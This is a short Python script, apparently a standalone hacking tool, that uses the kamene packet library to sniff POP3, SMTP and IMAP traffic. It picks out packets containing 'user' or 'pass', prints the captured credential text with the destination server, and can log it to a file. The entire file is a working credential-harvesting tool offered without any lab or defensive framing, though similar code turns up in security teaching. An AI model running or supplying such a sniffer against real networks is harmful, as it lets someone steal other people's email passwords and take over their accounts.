from kamene.all import sniff, TCP, IP
import argparse
from datetime import datetime

parser = argparse.ArgumentParser(description="Sniff email credentials from TCP traffic.")
parser.add_argument("-i", "--interface", help="Network interface to sniff on", required=False)
parser.add_argument("-o", "--output", help="Output file to save captured credentials", required=False)
args = parser.parse_args()


def packet_callback(packet):
    if packet.haslayer(IP) and packet.haslayer(TCP) and packet[TCP].payload:
        mail_packet = bytes(packet[TCP].payload)
        if b"user" in mail_packet.lower() or b"pass" in mail_packet.lower():
            timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
            server = packet[IP].dst
            output = f"{timestamp} Server: {server}\n{mail_packet.decode(errors='ignore')}\n"

            print(output)
            if args.output:
                with open(args.output, "a") as f:
                    f.write(output)


print("[*] Starting credential sniffer on email ports (POP3/SMTP/IMAP)...")
try:
    sniff(filter="tcp port 110 or tcp port 25 or tcp port 143",
          iface=args.interface,
          prn=packet_callback,
          store=0)
except KeyboardInterrupt:
    print("\n[*] Sniffing stopped by user.")
